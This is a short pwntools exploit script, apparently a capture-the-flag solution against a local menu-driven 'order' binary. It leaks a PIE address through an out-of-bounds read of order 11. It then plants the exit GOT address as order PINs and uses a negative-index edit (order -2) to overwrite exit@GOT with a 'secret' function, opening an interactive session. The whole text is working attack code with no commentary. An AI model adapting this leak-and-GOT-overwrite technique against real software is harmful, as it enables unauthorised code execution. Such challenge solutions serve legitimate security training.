from pwn import *
from pwncli import IO_FILE_plus_struct
exe = context.binary = ELF('./program', checksec=False)
HOST = 'localhost'
PORT = 3000

p = remote(HOST, PORT)

def twos_compliment(num):
    if num < 0:
        return 0x100000000 + num
    else:
        return num

p.sendlineafter(b'-> ', b'2')
p.sendlineafter(b': ', b'11')

p.recvuntil(b'Order ID: ')
leak1 = twos_compliment(int(p.recvline().strip().decode()))
p.recvuntil(b'Quantity: ')
leak2 = twos_compliment(int(p.recvline().strip().decode()))
leak = (leak2 << 32) | leak1

pie = leak - exe.sym['main']
secret = pie + exe.sym['secret']
exit_got = pie + exe.got['exit']
print(f"secret : {hex(secret)}")
print(f"[+] exit got: {hex(exit_got)}")

def to_signed(v):
    return v - 0x100000000 if v >= 0x80000000 else v

pins = [to_signed(exit_got & 0xffffffff), to_signed((exit_got >> 32) & 0xffffffff)]
for pin in pins:
    p.sendlineafter(b'-> ', b'1')
    p.sendlineafter(b'Enter quantity: ', b'1')
    p.sendlineafter(b'PIN for your order: ', str(pin).encode())
    p.sendlineafter(b'Enter order details: ', b'AAAA')
    p.recvuntil(b'Order placed successfully!')

p.sendlineafter(b'-> ', b'4')
p.sendlineafter(b'Enter Order ID: ', b'-2')
p.sendlineafter(b'Enter new details: ', p64(secret) + b'\n')
p.sendlineafter(b'-> ', b'x')

p.interactive()
